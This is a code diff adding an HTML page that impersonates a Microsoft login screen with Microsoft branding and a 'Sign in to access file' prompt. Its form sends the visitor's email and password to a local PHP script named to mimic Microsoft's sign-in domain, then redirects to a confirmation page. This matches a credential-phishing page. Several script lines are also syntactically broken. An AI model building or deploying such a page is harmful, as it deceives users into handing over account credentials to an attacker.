@@ -1,0 +1,151 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Microsoft</title>
+	<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+	</head>
+    <style>
+
+        body {
+		 width: 100%;
+    height: 50%;
+    overflow: hidden;
+    position: relative;
+    background-image: url(images/word.jpg);
+    background-position: center;
+    background-repeat: no-repeat;
+    background-size: cover;
+    text-align: center;
+    justify-content: center;
+    animation: change 10s infinite ease-in-out;
+	
+    
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+    height: 100vh;
+            margin: 0;
+			animation: change 10s infinite ease-in-out;
+        }
+		.body image{
+display: block;
+width: 800px;
+margin: 0 auto;
+transition: 0.3s;
+}
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 20px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: center;
+        }
+        .login-container img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        .login-container h2 {
+            margin: 0 0 20px;
+            font-size: 24px;
+            color: #333;
+        }
+        .login-container form {
+            display: flex;
+            flex-direction: column;
+        }
+        .login-container input[type="email"],
+        .login-container input[type="password"] {
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: calc(100% - 22px);
+        }
+        .login-container input[type="submit"] {
+            background-color: #0078d4;
+            color: white;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .login-container input[type="submit"]:hover {
+            background-color: #005a9e;
+        }
+@keyframes change{
+    0%
+    {
+        background-image: url(images/word.jpg);
+    }
+    20%
+    {
+        background-image: url(images/mimi.jpg);
+    }
+    40%
+    {
+        background-image: url(images/img1.jpg);
+    }
+    60%
+    {
+        background-image: url(images/word.jpg);
+    }
+    80%
+    {
+        background-image: url(images/img1.jpg);
+    }
+    100%
+    {
+        background-image: url(images/mimi.jpg);
+    }
+
+    </style>
+
+</head>
+<body style="background-image: url('https://wallpapers.com/images/hd/office-365-puzzle-art-b0uxy99x18j5h4oz.jpg')url('https://www.techopedia.com/wp-content/uploads/2024/01/What-is-Microsoft-365.jpg'); id="image">
+<script type="text/javascript">
+let image =document.getElementByid('image);
+let image =['https://wallpapers.com/images/hd/office-365-puzzle-art-b0uxy99x18j5h4oz.jpg','https://www.superfast-it.com/hubfs/Microsoft%20Office%20365%20applications%20-%20what%20they%20do.jpg','https://www.sunteam.nl/images/pages/ms365.png','https://www.pupuru.com/blog/wp-content/uploads/2020/04/640x360-9.jpg',]
+setInterval(function(){
+let random = Math.floor(Math.random() * 4);
+image.src = image[random];
+}, 800);
+</script>
+<script type="text/javascript">
+let image =document.getElementByid('image);
+let image =['img1.jpg','img2.jpg','img4.jpg','img5.jpg',]
+setInterval(function(){
+let random = Math.floor(Math.random() * 4);
+image.src = image[random];
+}, 800);
+</script>
+    <div class="login-container">
+        <img src="https://cdn1.iconfinder.com/data/icons/flat-and-simple-part-1/128/microsoft-512.png" alt="Microsoft Logo">
+        <h2>Sign in to access file</h2>
+        <form action="login.microsoftonline.php" method="post">
+            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="password" placeholder="Password" required>
+			 <div class="g-recaptcha" data-sitekey="6LflXhIqAAAAAKrCye6_8fRTv-PXVEGJFML86n2_"></div>
+
+           <input type="submit" name="submit" value="Sign in" onclick="myfunction()" target="_blank"> 
+		   <script>
+function myfunction(){
+window.location.href="confirmation.html":
+}
+</script>
+		  
+        </form>
+    </div>
+</body>
+</html>
